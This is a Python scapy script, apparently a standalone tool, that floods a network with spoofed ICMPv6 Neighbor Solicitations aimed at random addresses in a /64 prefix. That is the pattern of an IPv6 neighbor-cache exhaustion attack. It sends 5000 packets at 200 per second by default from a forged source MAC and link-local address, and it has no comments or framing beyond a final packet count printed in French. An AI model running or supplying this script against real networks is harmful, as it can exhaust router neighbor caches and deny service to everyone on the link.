#!/usr/bin/env python3
import argparse, random, time, ipaddress
from scapy.all import Ether, IPv6, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr, sendp

def random_target(prefix):
    net = ipaddress.IPv6Network(f"{prefix}/64", strict=False)
    return ipaddress.IPv6Address(int(net.network_address) | random.getrandbits(64))

def solicited_node(tgt):
    base = int(ipaddress.IPv6Address("ff02::1:ff00:0"))
    return ipaddress.IPv6Address(base | (int(tgt) & 0xffffff))

def solicited_mac(tgt):
    last3 = int(tgt) & 0xffffff
    return "33:33:ff:%02x:%02x:%02x" % ((last3 >> 16) & 0xff, (last3 >> 8) & 0xff, last3 & 0xff)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", required=True)
    p.add_argument("--prefix", required=True)
    p.add_argument("--src-mac", default="02:00:00:00:00:dd")
    p.add_argument("--src-ip", default="fe80::dead:beef")
    p.add_argument("--count", type=int, default=5000)
    p.add_argument("--rate", type=int, default=200)
    args = p.parse_args()

    delay = 1.0 / args.rate if args.rate > 0 else 0
    sent = 0
    t0 = time.time()
    for _ in range(args.count):
        tgt = random_target(args.prefix)
        pkt = (Ether(src=args.src_mac, dst=solicited_mac(tgt)) /
               IPv6(src=args.src_ip, dst=str(solicited_node(tgt))) /
               ICMPv6ND_NS(tgt=str(tgt)) /
               ICMPv6NDOptSrcLLAddr(lladdr=args.src_mac))
        sendp(pkt, iface=args.iface, verbose=False)
        sent += 1
        if delay:
            time.sleep(delay)
    elapsed = time.time() - t0
    print(f"{sent} NS envoyes en {elapsed:.1f}s")

if __name__ == "__main__":
    main()
